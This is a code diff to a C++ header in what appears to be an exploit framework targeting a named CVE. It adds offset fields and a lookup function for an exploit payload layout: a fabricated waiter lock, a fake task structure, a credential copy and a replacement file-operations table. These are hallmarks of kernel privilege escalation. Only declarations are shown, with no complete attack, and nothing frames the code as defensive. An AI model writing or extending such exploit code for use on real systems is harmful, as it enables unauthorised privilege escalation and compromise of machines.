@@ -67,4 +67,34 @@ namespace ghostlock::backend::cve_2026_43499 {
     [[nodiscard]] OffsetLookup fill_task_offsets(const memory::KeyView &view,
 
                                                  TaskOffsets &out) noexcept;
+    /** The payload-layout fields this backend reads an offset for, under the same rule as the task
+     *  fields: a field is added when a mechanism needs it, never in advance. The set is the one the
+     *  write path needs, read from the retired tree's derivation, which computed each address as the
+     *  payload base plus one of these offsets and overrode two of them per route. */
+    inline constexpr const char *kPayloadFields[] = {
+        "lock_offset",       /* where the fabricated waiter's lock word sits */
+        "waiter_w0_offset",  /* where the waiter's first word sits */
+        "fake_task_offset",  /* where the fabricated task starts */
+        "cred_copy_offset",  /* where the credential copy is laid out */
+        "fops_table_offset", /* where the replacement file operations sit */
+    };
+    inline constexpr std::size_t kPayloadFieldCount =
+        sizeof(kPayloadFields) / sizeof(kPayloadFields[0]);
+
+    /** Where those payload fields sit, each in its own member, in the same order as the list. */
+    struct PayloadOffsets final {
+        std::uint32_t lock_offset = 0U;
+        std::uint32_t waiter_w0_offset = 0U;
+        std::uint32_t fake_task_offset = 0U;
+        std::uint32_t cred_copy_offset = 0U;
+        std::uint32_t fops_table_offset = 0U;
+    };
+
+    /** Fill all five payload offsets from the pairs. All-or-nothing, exactly as the task offsets
+     *  are: on any refusal the caller's offsets are left untouched, so a half-read layout can never
+     *  be used by mistake. The refusal carries the field name, so the missing asset entry is
+     *  identified rather than guessed. */
+    [[nodiscard]] OffsetLookup fill_payload_offsets(const memory::KeyView &view,
+                                                    PayloadOffsets &out) noexcept;
+
 }  // namespace ghostlock::backend::cve_2026_43499
